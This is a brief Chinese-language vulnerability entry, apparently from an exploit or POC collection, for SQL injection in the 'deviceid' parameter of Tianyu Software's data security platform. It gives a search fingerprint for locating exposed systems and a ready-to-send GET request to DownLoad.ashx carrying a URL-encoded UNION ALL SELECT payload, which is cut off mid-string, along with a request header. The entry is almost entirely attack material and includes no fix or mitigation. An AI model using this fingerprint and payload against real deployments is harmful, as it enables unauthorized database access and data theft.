# 天喻软件数据安全平台deviceid存在SQL注入漏洞

- **系统**：天喻软件数据安全平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="数据安全"`
- **请求**：`GET /handler/DownLoad.ashx?operatetype=downloadsetupdll&deviceid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%2880%29%2BCHAR%28100%29%2BCHAR%2873%29%2BCHAR%28122%29%2BCHAR%2878%29%2BCHAR%2882%29%2BCHAR%2886%29%2BCHAR%28103%29%2BCHAR%2875%2`
- **关键头**：`Priority: u=1`